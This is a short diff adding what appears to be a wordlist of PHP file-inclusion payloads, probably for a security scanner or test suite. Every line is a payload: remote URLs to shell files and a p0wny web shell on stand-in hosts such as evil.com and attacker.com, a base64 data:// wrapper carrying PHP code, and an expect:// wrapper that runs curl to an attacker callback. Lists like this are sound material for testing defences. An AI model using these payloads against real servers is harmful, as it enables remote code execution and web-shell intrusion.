@@ -1,0 +1,6 @@
+http://evil.com/shell.txt
+https://attacker.com/p0wny.php
+//evil.com/shell.txt
+http://192.168.1.1/shell.txt
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+expect://curl http://attacker.com/callback
